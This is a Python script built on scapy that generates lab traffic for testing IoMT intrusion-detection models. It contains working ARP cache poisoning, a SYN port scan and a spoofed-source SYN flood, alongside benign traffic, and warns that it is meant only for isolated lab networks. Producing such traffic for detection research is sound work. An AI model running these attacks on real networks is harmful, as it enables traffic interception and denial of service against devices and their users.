"""
attack_simulator.py — CAAP live-demo traffic generator

Generates simulated benign + attack traffic against a TARGET_IP so that a
flow capture tool (CICFlowMeter) running on the same interface can produce
real flow records for the CAAP models to classify.

⚠ RUN ONLY IN AN ISOLATED LAB / VM NETWORK YOU OWN. Sending spoofed ARP
replies, SYN floods, or port scans on any network you don't have explicit
authorization for is illegal in most jurisdictions and this script is
provided strictly for controlled research/demo environments (e.g. an
isolated VirtualBox/VMware host-only network standing in for the IoMT
device segment).

Requires root/administrator privileges (raw sockets) and scapy:
    pip install scapy

Usage:
    sudo python attack_simulator.py --target 192.168.56.10 --gateway 192.168.56.1 --scenario arp_spoof
    sudo python attack_simulator.py --target 192.168.56.10 --scenario port_scan
    sudo python attack_simulator.py --target 192.168.56.10 --scenario syn_flood
    sudo python attack_simulator.py --target 192.168.56.10 --scenario benign
    sudo python attack_simulator.py --target 192.168.56.10 --scenario all   # cycles through everything
"""

import argparse
import random
import time

from scapy.all import (
    ARP,
    IP,
    TCP,
    ICMP,
    Ether,
    send,
    sendp,
    RandShort,
    conf,
)

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 8080, 8883]  # 8883 = MQTT/TLS


def arp_spoof(target_ip: str, gateway_ip: str, duration: int = 20):
    """Send periodic gratuitous ARP replies telling `target_ip` that we are the gateway."""
    print(f"[arp_spoof] Poisoning {target_ip}'s ARP cache for {duration}s — claiming to be {gateway_ip}")
    end = time.time() + duration
    while time.time() < end:
        pkt = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        send(pkt, verbose=False)
        time.sleep(2)
    print("[arp_spoof] Done.")


def port_scan(target_ip: str, ports=None):
    """A simple SYN scan across common ports — mirrors the Recon category in CIC IoMT."""
    ports = ports or COMMON_PORTS
    print(f"[port_scan] Scanning {len(ports)} ports on {target_ip}")
    for port in ports:
        pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=port, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.1)
    print("[port_scan] Done.")


def syn_flood(target_ip: str, target_port: int = 80, count: int = 500):
    """Rapid SYN packets to one port — a DoS_TCP style pattern."""
    print(f"[syn_flood] Sending {count} SYNs to {target_ip}:{target_port}")
    for _ in range(count):
        src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
        send(pkt, verbose=False)
    print("[syn_flood] Done.")


def benign_traffic(target_ip: str, duration: int = 20):
    """Normal-looking TCP handshakes + ICMP pings — gives CICFlowMeter benign flows too."""
    print(f"[benign] Generating normal traffic to {target_ip} for {duration}s")
    end = time.time() + duration
    while time.time() < end:
        if random.random() < 0.5:
            pkt = IP(dst=target_ip) / ICMP()
        else:
            port = random.choice([80, 443])
            pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=port, flags="S")
        send(pkt, verbose=False)
        time.sleep(random.uniform(0.5, 2.0))
    print("[benign] Done.")


def main():
    parser = argparse.ArgumentParser(description="CAAP lab traffic simulator")
    parser.add_argument("--target", required=True, help="Target IP (the simulated IoMT device)")
    parser.add_argument("--gateway", default=None, help="Gateway IP to spoof (arp_spoof scenario only)")
    parser.add_argument(
        "--scenario",
        choices=["arp_spoof", "port_scan", "syn_flood", "benign", "all"],
        default="benign",
    )
    parser.add_argument("--duration", type=int, default=20, help="Seconds for time-based scenarios")
    args = parser.parse_args()

    conf.verb = 0

    scenarios = {
        "arp_spoof": lambda: arp_spoof(args.target, args.gateway or "192.168.56.1", args.duration),
        "port_scan": lambda: port_scan(args.target),
        "syn_flood": lambda: syn_flood(args.target),
        "benign": lambda: benign_traffic(args.target, args.duration),
    }

    if args.scenario == "all":
        for name, fn in scenarios.items():
            print(f"\n=== Running scenario: {name} ===")
            fn()
            time.sleep(3)
    else:
        scenarios[args.scenario]()


if __name__ == "__main__":
    main()
